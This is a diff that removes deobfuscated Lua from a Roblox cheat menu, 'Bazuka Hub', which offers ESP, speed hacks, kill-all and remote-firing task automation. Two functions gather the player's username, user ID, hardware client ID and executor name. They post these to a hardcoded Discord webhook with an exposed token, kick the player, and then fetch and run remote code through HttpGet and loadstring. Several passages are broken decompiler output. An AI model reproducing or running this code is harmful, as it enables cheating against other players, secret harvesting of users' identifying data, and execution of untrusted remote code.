-    _1399(_1390, "Information:", "Left")
-    local _1401 = _1390.Section
-    _1401(_1390, "Last Update Changelog:", "Right")
-    local _1403 = _1356.Button
-    local _1404 = _1403(_1356, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _1405 = _1404.Section
-    local _1406 = _1405(_1404, "Automatism", "Left")
-    local _1407 = _1406.Toggle
-    _1407(_1406, {
-        Default = false,
-        Description = "Automatically sells everything",
-        Title = "Auto Sell All",
-    }, function(_1409, _1409_2, _1409_3)
-    end)
-    local _1410 = _1406.Toggle
-    _1410(_1406, {
-        Default = false,
-        Description = "Automatically collect everything",
-        Title = "Auto Collect All",
-    }, function(_1412, _1412_2, _1412_3)
-    end)
-    local _1413 = _1404.Section
-    local _1414 = _1413(_1404, "Character Exploit", "Right")
-    local _1415 = _1414.Toggle
-    _1415(_1414, {
-        Default = false,
-        Description = "Disables Cooldown for Rolling",
-        Title = "No Roll CD",
-    }, function(_1417, _1417_2, _1417_3)
-    end)
-    local _1418 = _1358.Button
-    local _1419 = _1418(_1358, "World Improve", "http://www.roblox.com/asset/?id=13321848320")
-    local _1420 = _1419.Section
-    local _1421 = _1420(_1419, "Ð¡ustom Time", "Left")
-    local _1422 = _1421.Toggle
-    _1422(_1421, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1424, _1424_2, _1424_3)
-    end)
-    local _1425 = _1421.Slider
-    _1425(_1421, {
-        Min = 0,
-        Title = "Hours",
-        Max = 23,
-        Default = 12,
-        Description = "",
-    }, function(_1427, _1427_2, _1427_3)
-        math.floor(_1427)
-    end)
-    local _1429 = _1421.Slider
-    _1429(_1421, {
-        Min = 0,
-        Title = "Minutes",
-        Max = 59,
-        Default = 0,
-        Description = "",
-    }, function(_1431, _1431_2, _1431_3)
-        math.floor(_1431)
-    end)
-    local _1433 = _1419.Section
-    local _1434 = _1433(_1419, "Custom Fog", "Right")
-    local _1435 = _1434.Toggle
-    _1435(_1434, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1437, _1437_2, _1437_3)
-    end)
-    local _1438 = _1434.Slider
-    _1438(_1434, {
-        Min = 0,
-        Title = "Fog End",
-        Max = 5000,
-        Default = 1000,
-        Description = "",
-    }, function(_1440, _1440_2, _1440_3)
-        math.floor(_1440)
-    end)
-    local _1442 = _1434.Slider
-    _1442(_1434, {
-        Min = 0,
-        Title = "Fog Start",
-        Max = 2000,
-        Default = 100,
-        Description = "",
-    }, function(_1444, _1444_2, _1444_3)
-        math.floor(_1444)
-    end)
-    type(_1374)
-    local _ = _1374.r
-    local _ = _1374.g
-    local _ = _1374.b
-    local _1450 = _1434.ColorPicker
-    local _1451 = Color3.new
-    local _1452 = _1451()
-    _1450(_1434, {
-        Default = _1452,
-        Description = "",
-        Title = "Fog Color",
-    }, function(_1454, _1454_2, _1454_3)
-    end)
-    local _1455 = _1360.Button
-    local _1456 = _1455(_1360, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _1457 = _1456.Section
-    local _1458 = _1457(_1456, "Character Actions", "Left")
-    local _1459 = _1458.Button
-    _1459(_1458, {
-        ButtonName = "Sit",
-        Title = "Sitting down",
-        Description = "",
-    }, function(_1461, _1461_2, _1461_3)
-        local _1462 = game.Players.LocalPlayer
-        local _1463 = _1462.Character
-        local _1464 = _1463.Humanoid
-        _1464.Sit = true
-    end)
-    local _1465 = _1458.Button
-    _1465(_1458, {
-        ButtonName = "Die",
-        Title = "Death",
-        Description = "",
-    }, function(_1467, _1467_2, _1467_3)
-        local _1468 = game.Players.LocalPlayer
-        local _1469 = _1468.Character
-        local _ = _1469.Humanoid
-        error("line 1: attempt to perform arithmetic (unm) on function")
-    end)
-    local _1471 = _1458.Button
-    _1471(_1458, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_1473, _1473_2, _1473_3)
-        local _TeleportService1474 = game:GetService("TeleportService")
-        local _1475 = _TeleportService1474.Teleport
-        local _Players1476 = game:GetService("Players")
-        local _1477 = _Players1476.LocalPlayer
-        _1475(_TeleportService1474, game.PlaceId, _1477)
-    end)
-    local _1479 = _1456.Section
-    local _1480 = _1479(_1456, "Jump Height Multiplier", "Right")
-    local _1481 = _1480.Toggle
-    _1481(_1480, {
-        Default = false,
-        Description = "Improve Your Jump Height",
-        Title = "Jump Miltiplier",
-    }, function(_1483, _1483_2, _1483_3)
-    end)
-    local _1484 = _1480.Slider
-    _1484(_1480, {
-        Min = 1,
-        Title = "Jump Height",
-        Max = 100,
-        Default = 7.2,
-        Description = "",
-    }, function(_1486, _1486_2, _1486_3)
-        math.floor(_1486)
-    end)
-    local _1488 = _1456.Section
-    local _1489 = _1488(_1456, "Walk Speed Multiplier", "Right")
-    local _1490 = _1489.Toggle
-    _1490(_1489, {
-        Default = false,
-        Description = "Improve Your Walk Speed",
-        Title = "Speed Multiplier",
-    }, function(_1492, _1492_2, _1492_3)
-    end)
-    local _1493 = _1489.Slider
-    _1493(_1489, {
-        Min = 1,
-        Title = "Walk Speed",
-        Max = 300,
-        Default = 16,
-        Description = "",
-    }, function(_1495, _1495_2, _1495_3)
-        math.floor(_1495)
-    end)
-    local _1497 = Instance.new
-    local _1498 = _1497("ScreenGui", game.CoreGui)
-    local _1499 = Instance.new
-    local _1500 = _1499("TextButton")
-    _1500.BackgroundTransparency = 1
-    local _1501 = UDim2.new
-    local _1502 = _1501(0, 0, 0, 0)
-    _1500.Size = _1502
-    _1500.Text = " "
-    _1500.Parent = _1498
-    local _1503 = Instance.new
-    local _1504 = _1503("ScreenGui", game.CoreGui)
-    _1504.Name = "BackgroundScreenGui"
-    _1504.Enabled = true
-    local _1505 = Instance.new
-    local _1506 = _1505("TextLabel", _1504)
-    _1506.Name = "BackgroundLabel"
-    local _1507 = Instance.new
-    local _1508 = _1507("UIGradient", _1506)
-    _1508.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _1555
-fenv.backgroundgradientcolor2 = _1557
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.autosaveconfig = false
-fenv.customguicolor = _1559
-fenv.customshadowcolor = _1561
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.synchronizationstatus = false
-fenv.synchrohitted = false
-fenv.originaltime = _1562
-fenv.customtime = "12:00:00"
-fenv.hours = 12
-fenv.minutes = 0
-fenv.changetimestatus = false
-fenv.originalfogcolor = _1563
-fenv.customfogcolor = _1565
-fenv.originalfogend = _1566
-fenv.customfogend = 1000
-fenv.originalfogstart = _1567
-fenv.customfogstart = 100
-fenv.changefogstatus = false
-fenv.origpos = _1569
-fenv.chamshiderstatus = false
-fenv.chamshideroutlinecolora = _1571
-fenv.chamshiderfillingcolora = _1573
-fenv.chamshideroutlinetransparencya = 0
-fenv.chamshiderfillingtransparencya = 0.9
-fenv.hiderespstatus = false
-fenv.namehiderespstatus = false
-fenv.distancehiderespstatus = false
-fenv.enabledhideroutline = true
-fenv.textsizenamehidera = 8
-fenv.namehiderespcolora = _1575
-fenv.hiderespoffseta = 0.5
-fenv.fontnamehideresp = "Montserrat"
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-fenv.origpos = _1628
-fenv.changetimestatus = _1683
-fenv.hours = _1687
-fenv.minutes = _1691
-fenv.changefogstatus = _1696
-fenv.customfogend = _1700
-fenv.customfogstart = _1704
-fenv.b = _1708
-fenv.g = _1707
-fenv.r = _1706
-fenv.customfogcolor = _1713
-fenv.chamshiderstatus = _1720
-fenv.chamshideroutlinetransparencya = _1725
-fenv.b = _1729
-fenv.g = _1728
-fenv.r = _1727
-fenv.chamshideroutlinecolora = _1734
-fenv.chamshiderfillingtransparencya = _1739
-fenv.b = _1743
-fenv.g = _1742
-fenv.r = _1741
-fenv.chamshiderfillingcolora = _1748
-fenv.hiderespstatus = _1753
-fenv.hiderespoffseta = _1758
-fenv.enabledhideroutline = _1761
-fenv.namehiderespstatus = _1764
-fenv.distancehiderespstatus = _1767
-fenv.textsizenamehidera = _1771
-fenv.b = _1775
-fenv.g = _1774
-fenv.r = _1773
-fenv.namehiderespcolora = _1780
-fenv.dingus = function(_1510, _1510_2, _1510_3)
-    local _1511 = game.Players.LocalPlayer
-    local _1512 = _1511.UserId
-    local _1513 = game.Players.LocalPlayer
-    local _1514 = _1513.DisplayName
-    local _1515 = game.Players.LocalPlayer
-    local _1516 = _1515.Name
-    local _RbxAnalyticsService1517 = game:GetService("RbxAnalyticsService")
-    local _1518 = _RbxAnalyticsService1517.GetClientId
-    local _1519 = _1518(_RbxAnalyticsService1517)
-    local _MarketplaceService1520 = game:GetService("MarketplaceService")
-    local _1521 = _MarketplaceService1520.GetProductInfo
-    local _1522 = _1521(_MarketplaceService1520, game.PlaceId)
-    local _1523 = _1522.Name
-    local _1524, _1524_2 = identifyexecutor()
-    local _1525, _1525_2, _1525_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _1512, _1514, _1516, _1512, _1519, "03/21/2025", "14:26:59", game.PlaceId, _1523, game.PlaceId, _1524)
-    local _1526 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _1512
-    local _1527 = _1526 .. "&width=150&height=150&format=png"
-    local _HttpService1528 = game:GetService("HttpService")
-    local _1529 = _HttpService1528.JSONEncode
-    local _1530 = _1529(_HttpService1528, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _1525,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _1527,
-                },
-            },
-        },
-    })
-    local _1531 = _1530.gsub
-    local _1532 = _1531(_1530, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _1532,
-    })
-    local _1534 = game.Players.LocalPlayer
-    local _1535 = _1534.Kick
-    _1535(_1534, "GOT YOU XD!")
-    local _1537 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _1538 = loadstring(_1537)
-    local _1539 = _1538()
-    local _1540 = _1539.new
-    local _1541 = game.Players.LocalPlayer
-    local _1542 = _1541.DisplayName
-    local _1543 = _1540("Bazuka Hub", _1542, "Bazuka Hub")
-    local _1544 = _1543.Category
-    local _1545 = _1544(_1543, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _1546 = _1543.Category
-    local _1547 = _1546(_1543, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _1548 = _1543.Category
-    local _1549 = _1548(_1543, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _1550 = _1543.Category
-    local _1551 = _1550(_1543, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _1552 = _1543.Category
-    _1552(_1543, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _1554 = Color3.fromRGB
-    _1554(255, 255, 255)
-    local _1556 = Color3.fromRGB
-    _1556(0, 0, 0)
-    local _1558 = Color3.fromRGB
-    _1558(160, 160, 160)
-    local _1560 = Color3.fromRGB
-    _1560(0, 0, 0)
-    local _ = game.Lighting.TimeOfDay
-    local _ = game.Lighting.FogColor
-    local _1564 = Color3.fromRGB
-    local _1565 = _1564(255, 255, 255)
-    local _ = game.Lighting.FogEnd
-    local _ = game.Lighting.FogStart
-    local _1568 = CFrame.new
-    _1568()
-    local _1570 = Color3.fromRGB
-    local _1571 = _1570(255, 255, 255)
-    local _1572 = Color3.fromRGB
-    local _1573 = _1572(255, 255, 255)
-    local _1574 = Color3.fromRGB
-    local _1575 = _1574(255, 255, 255)
-    task.spawn(function(_1577, _1577_2, _1577_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_1580, _1580_2, _1580_3)
-    end)
-    task.spawn(function(_1582, _1582_2, _1582_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_1585, _1585_2, _1585_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _1586 = _1543.Notification
-    _1586(_1543, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _1588 = _1545.Button
-    local _1589 = _1588(_1545, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _1590 = _1589.Section
-    local _1591 = _1590(_1589, "GUI was made by Bazuka_ofcx", "Left")
-    local _1592 = _1591.Button
-    _1592(_1591, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_1594, _1594_2, _1594_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _1595 = _1591.Button
-    _1595(_1591, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_1597, _1597_2, _1597_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _1598 = _1589.Section
-    _1598(_1589, "Information:", "Left")
-    local _1600 = _1589.Section
-    _1600(_1589, "Last Update Changelog:", "Right")
-    local _1602 = _1547.Button
-    local _1603 = _1602(_1547, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _1604 = _1603.Section
-    local _1605 = _1604(_1603, "Hunter", "Left")
-    local _1606 = _1605.Button
-    _1606(_1605, {
-        ButtonName = "Kill",
-        Title = "Killing All",
-        Description = "Only Hunter",
-    }, function(_1608, _1608_2, _1608_3)
-        local _1609 = game.Players.GetPlayers
-        local _1610 = _1609(game.Players)
-        for _1611, _1611_2 in _1610 do
-            local _1612 = _1611_2.Character
-            local _1613 = _1612.Parent
-            local _1614 = _1613.FindFirstChild
-            local _1615 = game.Players.LocalPlayer
-            local _1616 = _1615.Character
-            local _1617 = _1616.Name
-            _1614(_1613, _1617)
-        end
-    end)
-    local _1619 = _1603.Section
-    local _1620 = _1619(_1603, "Hider", "Right")
-    local _1621 = _1620.Button
-    _1621(_1620, {
-        ButtonName = "Complete",
-        Title = "Complete All",
-        Description = "Only with Task List",
-    }, function(_1623, _1623_2, _1623_3)
-        local _1624 = game.Players.LocalPlayer
-        local _1625 = _1624.Character
-        local _1626 = _1625.Rig
-        local _1627 = _1626.HumanoidRootPart
-        local _1628 = _1627.CFrame
-        local _1629 = game.Players.LocalPlayer
-        local _1630 = _1629.Character
-        local _1631 = _1630.Rig
-        local _1632 = _1631.HumanoidRootPart
-        local _1633 = game.Players.LocalPlayer
-        local _1634 = _1633.PlayerGui
-        local _1635 = _1634.DepositTaskListUI
-        local _1636 = _1635.Container
-        local _1637 = _1636.GetChildren
-        local _1638 = _1637(_1636)
-        for _1639, _1639_2 in _1638 do
-            local _ = _1639_2.name
-            local _1641 = _1639_2.isA
-            _1641(_1639_2, "TextButton")
-            local _1643 = _1639_2.text
-            local _1644 = _1643.match
-            local _1645 = _1644(_1643, "^(%S+)")
-            local _1646 = _1639_2.name
-            local _1647 = _1646.match
-            _1647(_1646, "%d+")
-            local _1649 = game.Workspace.GetDescendants
-            local _1650 = _1649(game.Workspace)
-            for _1651, _1651_2 in _1650 do
-                local _1652 = _1651_2.isA
-                _1652(_1651_2, "ProximityPrompt")
-                local _1654 = _1651_2.ObjectText
-                local _ = _1654 == _1645
-                local _1656 = _1651_2.Parent
-                local _1657 = _1656.Parent
-                local _1658 = _1657.CFrame
-                _1632.CFrame = _1658
-                local _ReplicatedStorage1659 = game:GetService("ReplicatedStorage")
-                local _1660 = _ReplicatedStorage1659.Modules
-                local _1661 = _1660.TypedRemotes
-                local _1662 = _1661.FindFirstChild
-                local _1663 = _1662(_1661, "13")
-                local _1664 = _1663.FireServer
-                _1664(_1663)
-                local _ReplicatedStorage1666 = game:GetService("ReplicatedStorage")
-                local _1667 = _ReplicatedStorage1666.Modules
-                local _1668 = _1667.TypedRemotes
-                local _1669 = _1668.FindFirstChild
-                local _1670 = _1669(_1668, "15")
-                local _1671 = _1670.InvokeServer
-                _1671(_1670)
-            end
-        end
-        local _1673 = game.Players.LocalPlayer
-        local _1674 = _1673.Character
-        local _1675 = _1674.Rig
-        local _1676 = _1675.HumanoidRootPart
-        _1676.CFrame = _1628
-    end)
-    local _1677 = _1549.Button
-    local _1678 = _1677(_1549, "World Improve", "http://www.roblox.com/asset/?id=11887653877")
-    local _1679 = _1678.Section
-    local _1680 = _1679(_1678, "Ð¡ustom Time", "Left")
-    local _1681 = _1680.Toggle
-    _1681(_1680, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1683, _1683_2, _1683_3)
-    end)
-    local _1684 = _1680.Slider
-    _1684(_1680, {
-        Min = 0,
-        Title = "Hours",
-        Max = 23,
-        Default = 12,
-        Description = "",
-    }, function(_1686, _1686_2, _1686_3)
-        math.floor(_1686)
-    end)
-    local _1688 = _1680.Slider
-    _1688(_1680, {
-        Min = 0,
-        Title = "Minutes",
-        Max = 59,
-        Default = 0,
-        Description = "",
-    }, function(_1690, _1690_2, _1690_3)
-        math.floor(_1690)
-    end)
-    local _1692 = _1678.Section
-    local _1693 = _1692(_1678, "Custom Fog", "Right")
-    local _1694 = _1693.Toggle
-    _1694(_1693, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1696, _1696_2, _1696_3)
-    end)
-    local _1697 = _1693.Slider
-    _1697(_1693, {
-        Min = 0,
-        Title = "Fog End",
-        Max = 5000,
-        Default = 1000,
-        Description = "",
-    }, function(_1699, _1699_2, _1699_3)
-        math.floor(_1699)
-    end)
-    local _1701 = _1693.Slider
-    _1701(_1693, {
-        Min = 0,
-        Title = "Fog Start",
-        Max = 2000,
-        Default = 100,
-        Description = "",
-    }, function(_1703, _1703_2, _1703_3)
-        math.floor(_1703)
-    end)
-    type(_1565)
-    local _ = _1565.r
-    local _ = _1565.g
-    local _ = _1565.b
-    local _1709 = _1693.ColorPicker
-    local _1710 = Color3.new
-    local _1711 = _1710()
-    _1709(_1693, {
-        Default = _1711,
-        Description = "",
-        Title = "Fog Color",
-    }, function(_1713, _1713_2, _1713_3)
-    end)
-    local _1714 = _1549.Button
-    local _1715 = _1714(_1549, "Chams & ESP", "http://www.roblox.com/asset/?id=12120698352")
-    local _1716 = _1715.Section
-    local _1717 = _1716(_1715, "Chams", "Left")
-    local _1718 = _1717.Toggle
-    _1718(_1717, {
-        Default = false,
-        Description = "Only Hunter",
-        Title = "Enable",
-    }, function(_1720, _1720_2, _1720_3)
-    end)
-    local _1721 = _1717.Slider
-    _1721(_1717, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_1723, _1723_2, _1723_3)
-        local _1724, _1724_2, _1724_3 = math.floor(_1723)
-        local _ = _1724 / 100
-    end)
-    type(_1571)
-    local _ = _1571.r
-    local _ = _1571.g
-    local _ = _1571.b
-    local _1730 = _1717.ColorPicker
-    local _1731 = Color3.new
-    local _1732 = _1731()
-    _1730(_1717, {
-        Default = _1732,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_1734, _1734_2, _1734_3)
-    end)
-    local _1735 = _1717.Slider
-    _1735(_1717, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_1737, _1737_2, _1737_3)
-        local _1738, _1738_2, _1738_3 = math.floor(_1737)
-        local _ = _1738 / 100
-    end)
-    type(_1573)
-    local _ = _1573.r
-    local _ = _1573.g
-    local _ = _1573.b
-    local _1744 = _1717.ColorPicker
-    local _1745 = Color3.new
-    local _1746 = _1745()
-    _1744(_1717, {
-        Default = _1746,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_1748, _1748_2, _1748_3)
-    end)
-    local _1749 = _1715.Section
-    local _1750 = _1749(_1715, "ESP", "Right")
-    local _1751 = _1750.Toggle
-    _1751(_1750, {
-        Default = false,
-        Description = "Only Hunter",
-        Title = "Enable",
-    }, function(_1753, _1753_2, _1753_3)
-    end)
-    local _1754 = _1750.Slider
-    _1754(_1750, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_1756, _1756_2, _1756_3)
-        local _1757, _1757_2, _1757_3 = math.floor(_1756)
-        local _ = _1757 / 100
-    end)
-    local _1759 = _1750.Toggle
-    _1759(_1750, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_1761, _1761_2, _1761_3)
-    end)
-    local _1762 = _1750.Toggle
-    _1762(_1750, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_1764, _1764_2, _1764_3)
-    end)
-    local _1765 = _1750.Toggle
-    _1765(_1750, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_1767, _1767_2, _1767_3)
-    end)
-    local _1768 = _1750.Slider
-    _1768(_1750, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_1770, _1770_2, _1770_3)
-        math.floor(_1770)
-    end)
-    type(_1575)
-    local _ = _1575.r
-    local _ = _1575.g
-    local _ = _1575.b
-    local _1776 = _1750.ColorPicker
-    local _1777 = Color3.new
-    local _1778 = _1777()
-    _1776(_1750, {
-        Default = _1778,
-        Description = "",
-        Title = "Text Color",
-    }, function(_1780, _1780_2, _1780_3)
-    end)
-    local _1781 = _1551.Button
-    local _1782 = _1781(_1551, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _1783 = _1782.Section
-    local _1784 = _1783(_1782, "Character Actions", "Left")
-    local _1785 = _1784.Button
-    _1785(_1784, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_1787, _1787_2, _1787_3)
-        local _TeleportService1788 = game:GetService("TeleportService")
-        local _1789 = _TeleportService1788.Teleport
-        local _Players1790 = game:GetService("Players")
-        local _1791 = _Players1790.LocalPlayer
-        _1789(_TeleportService1788, game.PlaceId, _1791)
-    end)
-    local _1793 = Instance.new
-    local _1794 = _1793("ScreenGui", game.CoreGui)
-    local _1795 = Instance.new
-    local _1796 = _1795("TextButton")
-    _1796.BackgroundTransparency = 1
-    local _1797 = UDim2.new
-    local _1798 = _1797(0, 0, 0, 0)
-    _1796.Size = _1798
-    _1796.Text = " "
-    _1796.Parent = _1794
-    local _1799 = Instance.new
-    local _1800 = _1799("ScreenGui", game.CoreGui)
-    _1800.Name = "BackgroundScreenGui"
-    _1800.Enabled = true
-    local _1801 = Instance.new
-    local _1802 = _1801("TextLabel", _1800)
-    _1802.Name = "BackgroundLabel"
-    local _1803 = Instance.new
-    local _1804 = _1803("UIGradient", _1802)
-    _1804.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _1851
-fenv.backgroundgradientcolor2 = _1853
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.customguicolor = _1855
-fenv.customshadowcolor = _1857
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.walkspeedmultiplier = false
-fenv.walkspeedplayer = 9
-fenv.fullbrightstatus = false
-fenv.levelofbrightness = 0
-fenv.fov = 80
-fenv.fovstatus = false
-fenv.uieffectsdisabler = false
-fenv.originalfogcolor = _1858
-fenv.customfogcolor = _1860
-fenv.originalfogend = _1861
-fenv.customfogend = 1000
-fenv.originalfogstart = _1862
-fenv.customfogstart = 100
-fenv.changefogstatus = false
-fenv.autoink = false
-fenv.autowakeup = false
-fenv.autoprinter = false
-fenv.managerchamsstatus = false
-fenv.managerchamsoutlinecolora = _1864
-fenv.managerchamsfillingcolora = _1866
-fenv.managerchamsoutlinetransparencya = 0
-fenv.managerchamsfillingtransparencya = 0.9
-fenv.shadowchamsstatus = false
-fenv.shadowchamsoutlinecolora = _1868
-fenv.shadowchamsfillingcolora = _1870
-fenv.shadowchamsoutlinetransparencya = 0
-fenv.shadowchamsfillingtransparencya = 0.9
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-fenv.autowakeup = _1903
-fenv.autoprinter = _1906
-fenv.autoink = _1909
-local _ = fenv.fireproximityprompt
-local _ = fenv.fireclickdetector
-fenv.uieffectsdisabler = _1965
-fenv.fullbrightstatus = _1968
-fenv.levelofbrightness = _1972
-fenv.fovstatus = _1975
-fenv.fov = _1979
-fenv.changefogstatus = _1984
-fenv.customfogend = _1988
-fenv.customfogstart = _1992
-fenv.b = _1996
-fenv.g = _1995
-fenv.r = _1994
-fenv.customfogcolor = _2001
-fenv.shadowchamsstatus = _2008
-fenv.shadowchamsoutlinetransparencya = _2013
-fenv.b = _2017
-fenv.g = _2016
-fenv.r = _2015
-fenv.shadowchamsoutlinecolora = _2022
-fenv.shadowchamsfillingtransparencya = _2027
-fenv.b = _2031
-fenv.g = _2030
-fenv.r = _2029
-fenv.shadowchamsfillingcolora = _2036
-fenv.managerchamsstatus = _2041
-fenv.managerchamsoutlinetransparencya = _2046
-fenv.b = _2050
-fenv.g = _2049
-fenv.r = _2048
-fenv.managerchamsoutlinecolora = _2055
-fenv.managerchamsfillingtransparencya = _2060
-fenv.b = _2064
-fenv.g = _2063
-fenv.r = _2062
-fenv.managerchamsfillingcolora = _2069
-fenv.walkspeedmultiplier = _2086
-fenv.walkspeedplayer = _2090
-fenv.nightwatch = function(_1806, _1806_2, _1806_3)
-    local _1807 = game.Players.LocalPlayer
-    local _1808 = _1807.UserId
-    local _1809 = game.Players.LocalPlayer
-    local _1810 = _1809.DisplayName
-    local _1811 = game.Players.LocalPlayer
-    local _1812 = _1811.Name
-    local _RbxAnalyticsService1813 = game:GetService("RbxAnalyticsService")
-    local _1814 = _RbxAnalyticsService1813.GetClientId
-    local _1815 = _1814(_RbxAnalyticsService1813)
-    local _MarketplaceService1816 = game:GetService("MarketplaceService")
-    local _1817 = _MarketplaceService1816.GetProductInfo
-    local _1818 = _1817(_MarketplaceService1816, game.PlaceId)
-    local _1819 = _1818.Name
-    local _1820, _1820_2 = identifyexecutor()
-    local _1821, _1821_2, _1821_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _1808, _1810, _1812, _1808, _1815, "03/21/2025", "14:26:59", game.PlaceId, _1819, game.PlaceId, _1820)
-    local _1822 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _1808
-    local _1823 = _1822 .. "&width=150&height=150&format=png"
-    local _HttpService1824 = game:GetService("HttpService")
-    local _1825 = _HttpService1824.JSONEncode
-    local _1826 = _1825(_HttpService1824, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _1821,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _1823,
-                },
-            },
-        },
-    })
-    local _1827 = _1826.gsub
-    local _1828 = _1827(_1826, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _1828,
-    })
-    local _1830 = game.Players.LocalPlayer
-    local _1831 = _1830.Kick
-    _1831(_1830, "GOT YOU XD!")
-    local _1833 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _1834 = loadstring(_1833)
-    local _1835 = _1834()
-    local _1836 = _1835.new
-    local _1837 = game.Players.LocalPlayer
-    local _1838 = _1837.DisplayName
-    local _1839 = _1836("Bazuka Hub", _1838, "Bazuka Hub")
-    local _1840 = _1839.Category
-    local _1841 = _1840(_1839, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _1842 = _1839.Category
-    local _1843 = _1842(_1839, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _1844 = _1839.Category
-    local _1845 = _1844(_1839, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _1846 = _1839.Category
-    local _1847 = _1846(_1839, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _1848 = _1839.Category
-    _1848(_1839, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _1850 = Color3.fromRGB
-    _1850(255, 255, 255)
